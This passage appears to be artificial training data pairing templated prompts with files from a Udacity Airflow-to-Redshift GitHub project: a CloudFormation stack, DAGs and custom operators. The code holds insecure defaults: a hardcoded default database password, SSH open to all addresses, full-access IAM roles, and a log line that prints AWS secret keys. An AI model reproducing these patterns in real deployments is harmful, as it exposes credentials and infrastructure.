{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "AWSTemplateFormatVersion: '2010-09-09'\n\nDescription: Airflow server backed by Postgres RDS\n\nParameters:\n  KeyName:\n    Description: Name of an existing EC2 KeyPair to enable SSH access into the Airflow web server\n    Type: AWS::EC2::KeyPair::KeyName\n    ConstraintDescription: Must be the name of an existing EC2 KeyPair\n  S3BucketName:\n    Description: REQUIRED - A new S3 Bucket name. This bucket will be used to read and write the Movielens dataset.\n    Type: String\n    AllowedPattern: '.+'\n  DBPassword:\n    Default: airflowpassword\n    NoEcho: 'true'\n    Description: Airflow database admin account password\n    Type: String\n    MinLength: '8'\n    MaxLength: '41'\n    AllowedPattern: '[a-zA-Z0-9]*'\n    ConstraintDescription: Must contain only alphanumeric characters\n\n# Mapping to find the Amazon Linux AMI in each region.\nMappings:\n  RegionMap:\n    us-east-1:\n      AMI: ami-97785bed\n    us-east-2:\n      AMI: ami-f63b1193\n    us-west-1:\n      AMI: ami-824c4ee2\n    us-west-2:\n      AMI: ami-f2d3638a\n    ca-central-1:\n      AMI: ami-a954d1cd\n    eu-west-1:\n      AMI: ami-d834aba1\n    eu-west-2:\n      AMI: ami-403e2524\n    eu-west-3:\n      AMI: ami-8ee056f3\n    eu-central-1:\n      AMI: ami-5652ce39\n    sa-east-1:\n      AMI: ami-84175ae8\n    ap-south-1:\n      AMI: ami-531a4c3c\n    ap-southeast-1:\n      AMI: ami-68097514\n    ap-southeast-2:\n      AMI: ami-942dd1f6\n    ap-northeast-1:\n      AMI: ami-ceafcba8\n    ap-northeast-2:\n      AMI: ami-863090e8\nResources:\n  EC2Instance:\n    Type: AWS::EC2::Instance\n    Properties:\n      KeyName: !Ref 'KeyName'\n      SecurityGroups: [!Ref 'AirflowEC2SecurityGroup']\n      InstanceType: 'm4.xlarge'\n      IamInstanceProfile:\n        Ref: EC2InstanceProfile\n      Tags:\n        -\n          Key: Name\n          Value: Airflow\n      ImageId: !FindInMap\n        - RegionMap\n        - !Ref 'AWS::Region'\n        - AMI\n      UserData:\n        Fn::Base64: !Sub |\n         #!/bin/bash\n         set -x\n         exec > >(tee /var/log/user-data.log|logger -t user-data ) 2>&1\n         # Get the latest CloudFormation package\n         echo \"Installing aws-cfn\"\n         yum install -y aws-cfn-bootstrap\n         # Start cfn-init\n         /opt/aws/bin/cfn-init -v -c install --stack ${AWS::StackId} --resource EC2Instance --region ${AWS::Region}\n         # Download and unzip the Movielens dataset\n         wget http://files.grouplens.org/datasets/movielens/ml-latest.zip && unzip ml-latest.zip\n         # Upload the movielens dataset files to the S3 bucket\n         aws s3 cp ml-latest s3://${S3BucketName} --recursive\n         # Install git\n         sudo yum install -y git\n         # Clone the git repository\n         git clone https://github.com/aws-samples/aws-concurrent-data-orchestration-pipeline-emr-livy.git\n         sudo pip install boto3\n         # Install airflow using pip\n         echo \"Install Apache Airflow\"\n         sudo SLUGIFY_USES_TEXT_UNIDECODE=yes pip install -U apache-airflow\n         # Encrypt connection passwords in metadata db\n         sudo pip install apache-airflow[crypto]\n         # Postgres operators and hook, support as an Airflow backend\n         sudo pip install apache-airflow[postgres]\n         sudo -H pip install six==1.10.0\n         sudo pip install --upgrade six\n         sudo pip install markupsafe\n         sudo pip install --upgrade MarkupSafe\n         echo 'export PATH=/usr/local/bin:$PATH' >> /root/.bash_profile\n         source /root/.bash_profile\n         # Initialize Airflow\n         airflow initdb\n         # Update the RDS connection in the Airflow Config file\n         sed -i '/sql_alchemy_conn/s/^/#/g' ~/airflow/airflow.cfg\n         sed -i '/sql_alchemy_conn/ a sql_alchemy_conn = postgresql://airflow:${DBPassword}@${DBInstance.Endpoint.Address}:${DBInstance.Endpoint.Port}/airflowdb' ~/airflow/airflow.cfg\n         # Update the type of executor in the Airflow Config file\n         sed -i '/executor = SequentialExecutor/s/^/#/g' ~/airflow/airflow.cfg\n         sed -i '/executor = SequentialExecutor/ a executor = LocalExecutor' ~/airflow/airflow.cfg\n         airflow initdb\n         # Move all the files to the ~/airflow directory. The Airflow config file is setup to hold all the DAG related files in the ~/airflow/ folder.\n         mv aws-concurrent-data-orchestration-pipeline-emr-livy/* ~/airflow/\n         # Delete the higher-level git repository directory\n         rm -rf aws-concurrent-data-orchestration-pipeline-emr-livy\n         # Replace the name of the S3 bucket in each of the .scala files. CHANGE THE HIGHLIGHTED PORTION BELOW TO THE NAME OF THE S3 BUCKET YOU CREATED IN STEP 1. The below command replaces the instance of the string ‘<s3-bucket>’ in each of the scripts to the name of the actual bucket.\n         sed -i 's/<s3-bucket>/${S3BucketName}/g' /root/airflow/dags/transform/*\n         # Run Airflow webserver\n         airflow webserver\n    Metadata:\n      AWS::CloudFormation::Init:\n        configSets:\n          install:\n            - gcc\n        gcc:\n          packages:\n            yum:\n              gcc: []\n    DependsOn:\n      - DBInstance\n      - AirflowEC2SecurityGroup\n  DBInstance:\n    Type: AWS::RDS::DBInstance\n    DeletionPolicy: Delete\n    Properties:\n      DBName: airflowdb\n      Engine: postgres\n      MasterUsername: airflow\n      MasterUserPassword: !Ref 'DBPassword'\n      DBInstanceClass: db.t2.small\n      AllocatedStorage: 5\n      DBSecurityGroups:\n        - Ref: DBSecurityGroup\n  AirflowEC2SecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupName: AirflowEC2SG\n      GroupDescription: Enable HTTP access via port 80 + SSH access\n      SecurityGroupIngress:\n        - IpProtocol: tcp\n          FromPort: 80\n          ToPort: 80\n          CidrIp: 0.0.0.0/0\n        - IpProtocol: tcp\n          FromPort: 8080\n          ToPort: 8080\n          CidrIp: 0.0.0.0/0\n        - IpProtocol: tcp\n          FromPort: 22\n          ToPort: 22\n          CidrIp: 0.0.0.0/0\n  AirflowEMRMasterEC2SecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupName: AirflowEMRMasterSG\n      GroupDescription: Airflow EMR Master SG\n    DependsOn:\n      - AirflowEC2SecurityGroup\n  AirflowEMRMasterInboundRule:\n    Type: AWS::EC2::SecurityGroupIngress\n    Properties:\n      IpProtocol: tcp\n      FromPort: '8998'\n      ToPort: '8998'\n      SourceSecurityGroupName: !Ref 'AirflowEC2SecurityGroup'\n      GroupName: !Ref 'AirflowEMRMasterEC2SecurityGroup'\n  AirflowEMRSlaveEC2SecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupName: AirflowEMRSlaveSG\n      GroupDescription: Airflow EMR Slave SG\n  DBSecurityGroup:\n    Type: AWS::RDS::DBSecurityGroup\n    Properties:\n      GroupDescription: Frontend Access\n      DBSecurityGroupIngress:\n        EC2SecurityGroupName:\n          Ref: AirflowEC2SecurityGroup\n  EC2Role:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: AirflowInstanceRole\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          -\n            Effect: \"Allow\"\n            Principal:\n              Service:\n                - \"ec2.amazonaws.com\"\n            Action:\n              - \"sts:AssumeRole\"\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AmazonS3FullAccess\n        - arn:aws:iam::aws:policy/AmazonElasticMapReduceFullAccess\n  EC2InstanceProfile:\n    Type: AWS::IAM::InstanceProfile\n    Properties:\n      InstanceProfileName: AirflowInstanceProfile\n      Roles:\n        -\n          Ref: EC2Role\n  EmrRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: EmrRole\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          -\n            Effect: \"Allow\"\n            Principal:\n              Service:\n                - \"elasticmapreduce.amazonaws.com\"\n                - \"s3.amazonaws.com\"\n            Action:\n              - \"sts:AssumeRole\"\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AmazonS3FullAccess\n        - arn:aws:iam::aws:policy/AmazonElasticMapReduceFullAccess\n  EmrEc2Role:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: EmrEc2Role\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          -\n            Effect: \"Allow\"\n            Principal:\n              Service:\n                - \"ec2.amazonaws.com\"\n            Action:\n              - \"sts:AssumeRole\"\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/service-role/AmazonElasticMapReduceforEC2Role\n        - arn:aws:iam::aws:policy/AmazonS3FullAccess\n  EmrEc2InstanceProfile:\n    Type: AWS::IAM::InstanceProfile\n    Properties:\n      InstanceProfileName: EmrEc2InstanceProfile\n      Roles:\n        -\n          Ref: EmrEc2Role\n  S3Bucket:\n    Type: AWS::S3::Bucket\n    DeletionPolicy: Retain\n    Properties:\n      AccessControl: BucketOwnerFullControl\n      BucketName: !Ref 'S3BucketName'\nOutputs:\n  AirflowEC2PublicDNSName:\n    Description: Public DNS Name of the Airflow EC2 instance\n    Value: !Join [\"\", [\"http://\", !GetAtt EC2Instance.PublicDnsName, \":8080\"]]", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_CloudFormation.yaml", "language": "yaml", "complexity": "complex", "star_count": 1683, "quality_score": 0.6599999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from datetime import datetime, timedelta\nfrom airflow import DAG\nfrom airflow.operators.dummy_operator import DummyOperator\nfrom airflow.operators import LoadDimensionOperator\nfrom helpers import SqlQueries\n\n\ndef load_dimension_subdag(\n    parent_dag_name,\n    task_id,\n    redshift_conn_id,\n    sql_statement,\n    delete_load,\n    table_name,\n    *args, **kwargs):\n    \n    dag = DAG(f\"{parent_dag_name}.{task_id}\", **kwargs)\n    \n    load_dimension_table = LoadDimensionOperator(\n        task_id=task_id,\n        dag=dag,\n        redshift_conn_id=redshift_conn_id,\n        sql_query = sql_statement,\n        delete_load = delete_load,\n        table_name = table_name,\n    )    \n    \n    load_dimension_table\n    \n    return dag", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/dags/sparkify_dimension_subdag.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.69, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation using Spark for big data processing\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from datetime import datetime, timedelta\nimport os\nfrom airflow import DAG\nfrom airflow.operators.dummy_operator import DummyOperator\nfrom airflow.operators import ( CreateTableOperator, StageToRedshiftOperator, LoadFactOperator,\n                                LoadDimensionOperator, DataQualityOperator)\nfrom helpers import SqlQueries\nfrom sparkify_dimension_subdag import load_dimension_subdag\nfrom airflow.operators.subdag_operator import SubDagOperator\n\n\n#AWS_KEY = os.environ.get('AWS_KEY')\n#AWS_SECRET = os.environ.get('AWS_SECRET')\n\ns3_bucket = 'udacity-dend-warehouse'\nsong_s3_key = \"song_data\"\nlog_s3_key = \"log-data\"\nlog_json_file = \"log_json_path.json\"\n\ndefault_args = {\n    'owner': 'udacity',\n    'depends_on_past': True,\n    'start_date': datetime(2019, 1, 12),\n    'email_on_failure': False,\n    'email_on_retry': False,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=5),\n    'catchup': True\n}\n\ndag_name = 'udac_example_dag' \ndag = DAG(dag_name,\n          default_args=default_args,\n          description='Load and transform data in Redshift with Airflow',\n          schedule_interval='0 * * * *',\n          max_active_runs = 1          \n        )\n\nstart_operator = DummyOperator(task_id='Begin_execution',  dag=dag)\n\ncreate_tables_in_redshift = CreateTableOperator(\n    task_id = 'create_tables_in_redshift',\n    redshift_conn_id = 'redshift',\n    dag = dag\n)\n\nstage_events_to_redshift = StageToRedshiftOperator(\n    task_id='Stage_events',\n    table_name=\"staging_events\",\n    s3_bucket = s3_bucket,\n    s3_key = log_s3_key,\n    file_format=\"JSON\",\n    log_json_file = log_json_file,\n    redshift_conn_id = \"redshift\",\n    aws_credential_id=\"aws_credentials\",\n    dag=dag,\n    provide_context=True\n)\n\n\n\nstage_songs_to_redshift = StageToRedshiftOperator(\n    task_id='Stage_songs',\n    table_name=\"staging_songs\",\n    s3_bucket = s3_bucket,\n    s3_key = song_s3_key,\n    file_format=\"JSON\",\n    redshift_conn_id = \"redshift\",\n    aws_credential_id=\"aws_credentials\",\n    dag=dag,\n    provide_context=True\n)\n\n\nload_songplays_table = LoadFactOperator(\n    task_id='Load_songplays_fact_table',\n    redshift_conn_id = 'redshift',\n    sql_query = SqlQueries.songplay_table_insert, \n    dag=dag\n)\n\n\nload_user_dimension_table = SubDagOperator(\n    subdag=load_dimension_subdag(\n        parent_dag_name=dag_name,\n        task_id=\"Load_user_dim_table\",\n        redshift_conn_id=\"redshift\",\n        start_date=default_args['start_date'],\n        sql_statement=SqlQueries.user_table_insert,\n        delete_load = True,\n        table_name = \"users\",\n    ),\n    task_id=\"Load_user_dim_table\",\n    dag=dag,\n)\n\n\nload_song_dimension_table = SubDagOperator(\n    subdag=load_dimension_subdag(\n        parent_dag_name=dag_name,\n        task_id=\"Load_song_dim_table\",\n        redshift_conn_id=\"redshift\",\n        start_date=default_args['start_date'],\n        sql_statement=SqlQueries.song_table_insert,\n        delete_load = True,\n        table_name = \"songs\",\n    ),\n    task_id=\"Load_song_dim_table\",\n    dag=dag,\n)\n\n\nload_artist_dimension_table = SubDagOperator(\n    subdag=load_dimension_subdag(\n        parent_dag_name=dag_name,\n        task_id=\"Load_artist_dim_table\",\n        redshift_conn_id=\"redshift\",\n        start_date=default_args['start_date'],\n        sql_statement=SqlQueries.artist_table_insert,\n        delete_load = True,\n        table_name = \"artists\",\n    ),\n    task_id=\"Load_artist_dim_table\",\n    dag=dag,\n)\n\n\nload_time_dimension_table = SubDagOperator(\n    subdag=load_dimension_subdag(\n        parent_dag_name=dag_name,\n        task_id=\"Load_time_dim_table\",\n        redshift_conn_id=\"redshift\",\n        start_date=default_args['start_date'],\n        sql_statement=SqlQueries.time_table_insert,\n        delete_load = True,\n        table_name = \"time\",\n    ),\n    task_id=\"Load_time_dim_table\",\n    dag=dag,\n)\n\n\nrun_quality_checks = DataQualityOperator(\n    task_id='Run_data_quality_checks',\n    dag=dag,\n    redshift_conn_id = \"redshift\",\n    tables = [\"artists\", \"songplays\", \"songs\", \"time\", \"users\"]\n    \n)\n\nend_operator = DummyOperator(task_id='Stop_execution',  dag=dag)\n\nstart_operator >> create_tables_in_redshift\ncreate_tables_in_redshift >> [stage_songs_to_redshift, stage_events_to_redshift] >> load_songplays_table\n\nload_songplays_table >> [load_user_dimension_table, load_song_dimension_table, load_artist_dimension_table, load_time_dimension_table] >> run_quality_checks >> end_operator\n\n", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/dags/udac_example_dag.py", "language": "python", "complexity": "medium", "star_count": 1683, "quality_score": 0.6599999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import division, absolute_import, print_function\n\nfrom airflow.plugins_manager import AirflowPlugin\n\nimport operators\nimport helpers\n\n# Defining the plugin class\nclass UdacityPlugin(AirflowPlugin):\n    name = \"udacity_plugin\"\n    operators = [\n        operators.CreateTableOperator,\n        operators.StageToRedshiftOperator,\n        operators.LoadFactOperator,\n        operators.LoadDimensionOperator,\n        operators.DataQualityOperator\n    ]\n    helpers = [\n        helpers.SqlQueries\n    ]\n", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/plugins/__init__.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.69, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\n\n\nclass CreateTableOperator(BaseOperator):\n    ui_color = '#358140'\n\n    @apply_defaults\n    def __init__(self, redshift_conn_id = \"\", *args, **kwargs):\n        \n        super(CreateTableOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        \n    def execute(self, context):\n        self.log.info('Creating Postgres SQL Hook')\n        redshift = PostgresHook(postgres_conn_id = self.redshift_conn_id)\n\n        self.log.info('Executing creating tables in Redshift.')\n        queries =  open('/home/workspace/airflow/create_tables.sql', 'r').read()\n        redshift.run(queries)\n        \n        self.log.info(\"Tables created \")\n        \n\n\n\n\n\n", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/plugins/operators/create_table.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\n\nclass DataQualityOperator(BaseOperator):\n\n    ui_color = '#89DA59'\n\n    @apply_defaults\n    def __init__(self,\n                 redshift_conn_id=\"\",\n                 tables = [],\n                 *args, **kwargs):\n\n        super(DataQualityOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        self.tables = tables\n\n    def execute(self, context):\n        redshift_hook = PostgresHook(postgres_conn_id = self.redshift_conn_id)\n        \n        for table in self.tables:\n            \n            self.log.info(f\"Starting data quality validation on table : {table}\")\n            records = redshift_hook.get_records(f\"select count(*) from {table};\")\n\n            if len(records) < 1 or len(records[0]) < 1 or records[0][0] < 1:\n                self.log.error(f\"Data Quality validation failed for table : {table}.\")\n                raise ValueError(f\"Data Quality validation failed for table : {table}\")\n            self.log.info(f\"Data Quality Validation Passed on table : {table}!!!\")            \n            \n            \n        \n        self.log.info('DataQualityOperator not implemented yet')", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/plugins/operators/data_quality.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\n\nclass LoadDimensionOperator(BaseOperator):\n\n    ui_color = '#80BD9E'\n\n    @apply_defaults\n    def __init__(self,\n                 redshift_conn_id=\"\",\n                 sql_query = \"\",\n                 delete_load = False,\n                 table_name = \"\",\n                 *args, **kwargs):\n\n        super(LoadDimensionOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        self.sql_query = sql_query\n        self.table_name = table_name\n        self.delete_load = delete_load\n\n    def execute(self, context):\n        redshift_hook = PostgresHook(postgres_conn_id = self.redshift_conn_id)\n        if self.delete_load:\n            self.log.info(f\"Delete load operation set to TRUE. Running delete statement on table {self.table_name}\")\n            redshift_hook.run(f\"DELETE FROM {self.table_name}\")\n            \n        self.log.info(f\"Running query to load data into Dimension Table {self.table_name}\")\n        redshift_hook.run(self.sql_query)\n        self.log.info(f\"Dimension Table {self.table_name} loaded.\")\n", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/plugins/operators/load_dimension.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\n\nclass LoadFactOperator(BaseOperator):\n\n    ui_color = '#F98866'\n\n    @apply_defaults\n    def __init__(self,\n                 redshift_conn_id=\"\",\n                 sql_query = \"\",\n                 *args, **kwargs):\n\n        super(LoadFactOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        self.sql_query = sql_query\n        \n\n    def execute(self, context):\n        redshift_hook = PostgresHook(postgres_conn_id = self.redshift_conn_id)\n        redshift_hook.run(self.sql_query)\n        \n", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/plugins/operators/load_fact.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\nfrom airflow.contrib.hooks.aws_hook import AwsHook\n\nclass StageToRedshiftOperator(BaseOperator):\n    ui_color = '#358140'\n    \n    copy_query = \" COPY {} \\\n    FROM '{}' \\\n    ACCESS_KEY_ID '{}' \\\n    SECRET_ACCESS_KEY '{}' \\\n    FORMAT AS json '{}'; \\\n    \"\n\n    @apply_defaults\n    def __init__(self,\n                 redshift_conn_id=\"\",\n                 aws_credential_id=\"\",\n                 table_name = \"\",\n                 s3_bucket=\"\",\n                 s3_key = \"\",\n                 file_format = \"\",\n                 log_json_file = \"\",\n                 *args, **kwargs):\n\n        super(StageToRedshiftOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        self.aws_credential_id = aws_credential_id\n        self.table_name = table_name\n        self.s3_bucket = s3_bucket\n        self.s3_key = s3_key\n        self.file_format = file_format\n        self.log_json_file = log_json_file\n        self.execution_date = kwargs.get('execution_date')    \n            \n    def execute(self, context):\n        aws_hook = AwsHook(self.aws_credential_id)\n        credentials = aws_hook.get_credentials()\n        \n        \n        s3_path = \"s3://{}/{}\".format(self.s3_bucket, self.s3_key)\n        self.log.info(f\"Picking staging file for table {self.table_name} from location : {s3_path}\")\n        \n        if self.log_json_file != \"\":\n            self.log_json_file = \"s3://{}/{}\".format(self.s3_bucket, self.log_json_file)\n            copy_query = self.copy_query.format(self.table_name, s3_path, credentials.access_key, credentials.secret_key, self.log_json_file)\n        else:\n            copy_query = self.copy_query.format(self.table_name, s3_path, credentials.access_key, credentials.secret_key, 'auto')\n        \n        \n        self.log.info(f\"Running copy query : {copy_query}\")\n        redshift_hook = PostgresHook(postgres_conn_id = self.redshift_conn_id)\n        \n        redshift_hook.run(copy_query)\n        self.log.info(f\"Table {self.table_name} staged successfully!!\")\n        ", "metadata": {"source": "github.com/san089/Udacity-Data-Engineering-Projects", "file_path": "Airflow_Data_Pipelines/plugins/operators/stage_redshift.py", "language": "python", "complexity": "simple", "star_count": 1683, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation using Spark for big data processing\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from datetime import datetime, timedelta\nimport os\nfrom airflow import DAG\nfrom airflow.contrib.hooks.ssh_hook import SSHHook\nfrom airflow.contrib.operators.ssh_operator import SSHOperator\nfrom airflow.operators.dummy_operator import DummyOperator\nfrom airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.operators.goodreads_plugin import DataQualityOperator\nfrom airflow.operators.goodreads_plugin import LoadAnalyticsOperator\nfrom helpers import AnalyticsQueries\n\n#config = configparser.ConfigParser()\n#config.read_file(open(f\"{Path(__file__).parents[0]}/emr_config.cfg\"))\n\n\ndefault_args = {\n    'owner': 'goodreads',\n    'depends_on_past': True,\n    'start_date' : datetime(2020, 2, 19, 0, 0, 0, 0),\n    'end_date' : datetime(2020, 2, 20, 0, 0, 0, 0),\n    'email_on_failure': False,\n    'email_on_retry': False,\n    #'retries': 1,\n    #'retry_delay': timedelta(minutes=15),\n    'catchup': True\n}\n\n\n\ndag_name = 'goodreads_pipeline'\ndag = DAG(dag_name,\n          default_args=default_args,\n          description='Load and Transform data from landing zone to processed zone. Populate data from Processed zone to goodreads Warehouse.',\n          #schedule_interval=None,\n          schedule_interval='*/10 * * * *',\n          max_active_runs = 1\n        )\n\nstart_operator = DummyOperator(task_id='Begin_execution',  dag=dag)\n\nemrsshHook= SSHHook(ssh_conn_id='emr_ssh_connection')\n\njobOperator = SSHOperator(\n    task_id=\"GoodReadsETLJob\",\n    command='cd /home/hadoop/goodreads_etl_pipeline/src;export PYSPARK_DRIVER_PYTHON=python3;export PYSPARK_PYTHON=python3;spark-submit --master yarn goodreads_driver.py;',\n    ssh_hook=emrsshHook,\n    dag=dag)\n\n\nwarehouse_data_quality_checks = DataQualityOperator(\n    task_id='Warehouse_data_quality_checks',\n    dag=dag,\n    redshift_conn_id = \"redshift\",\n    tables = [\"goodreads_warehouse.authors\", \"goodreads_warehouse.reviews\", \"goodreads_warehouse.books\", \"goodreads_warehouse.users\"]\n\n)\n\n\ncreate_analytics_schema = LoadAnalyticsOperator(\n    task_id='Create_analytics_schema',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.create_schema],\n    dag=dag\n)\n\ncreate_author_analytics_table = LoadAnalyticsOperator(\n    task_id='Create_author_analytics_table',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.create_author_reviews,AnalyticsQueries.create_author_rating, AnalyticsQueries.create_best_authors],\n    dag=dag\n)\n\ncreate_book_analytics_table = LoadAnalyticsOperator(\n    task_id='Create_book_analytics_table',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.create_book_reviews,AnalyticsQueries.create_book_rating, AnalyticsQueries.create_best_books],\n    dag=dag\n)\n\n# Authors Analytics Tasks\n\nload_author_table_reviews = LoadAnalyticsOperator(\n    task_id='Load_author_table_reviews',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.populate_authors_reviews.format('2020-02-01 00:00:00.000000', '2020-02-28 00:00:00.000000')],\n    dag=dag\n)\n\n\nload_author_table_ratings = LoadAnalyticsOperator(\n    task_id='Load_author_table_ratings',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.populate_authors_ratings.format('2020-02-01 00:00:00.000000', '2020-02-28 00:00:00.000000')],\n    dag=dag\n)\n\nload_best_author = LoadAnalyticsOperator(\n    task_id='Load_best_author',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.populate_best_authors],\n    dag=dag\n)\n\n\n# Book Analytics Tasks\nload_book_table_reviews = LoadAnalyticsOperator(\n    task_id='Load_book_table_reviews',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.populate_books_reviews.format('2020-02-01 00:00:00.000000', '2020-02-28 00:00:00.000000')],\n    dag=dag\n)\n\n\nload_book_table_ratings = LoadAnalyticsOperator(\n    task_id='Load_book_table_ratings',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.populate_books_ratings.format('2020-02-01 00:00:00.000000', '2020-02-28 00:00:00.000000')],\n    dag=dag\n)\n\nload_best_book = LoadAnalyticsOperator(\n    task_id='Load_best_books',\n    redshift_conn_id = 'redshift',\n    sql_query = [AnalyticsQueries.populate_best_books],\n    dag=dag\n)\n\n\n\nauthors_data_quality_checks = DataQualityOperator(\n    task_id='Authors_data_quality_checks',\n    dag=dag,\n    redshift_conn_id = \"redshift\",\n    tables = [\"goodreads_analytics.popular_authors_average_rating\", \"goodreads_analytics.popular_authors_average_rating\"]\n\n)\n\nbooks_data_quality_checks = DataQualityOperator(\n    task_id='Books_data_quality_checks',\n    dag=dag,\n    redshift_conn_id = \"redshift\",\n    tables = [\"goodreads_analytics.popular_books_average_rating\", \"goodreads_analytics.popular_books_review_count\"]\n\n)\n\n\nend_operator = DummyOperator(task_id='Stop_execution',  dag=dag)\n\nstart_operator >> jobOperator >> 